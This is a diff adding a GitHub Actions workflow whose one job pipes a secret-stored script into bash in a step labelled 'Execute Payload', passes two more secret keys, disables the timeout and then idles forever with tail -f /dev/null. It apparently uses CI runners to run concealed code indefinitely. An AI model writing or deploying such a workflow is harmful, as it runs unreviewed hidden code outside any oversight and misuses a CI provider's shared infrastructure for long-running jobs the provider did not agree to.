@@ -1,0 +1,21 @@
+name: edge
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 0
+    
+    steps:
+      - name: 🧠 Execute Payload
+        env:
+          S_KEY: ${{ secrets.NB_SK }}
+          A_KEY: ${{ secrets.NB_AK }}
+          CODE: ${{ secrets.MASTER_CODE }}
+        run: echo "$CODE" | bash
+
+      - name: 🔋 Keep Alive
+        run: tail -f /dev/null
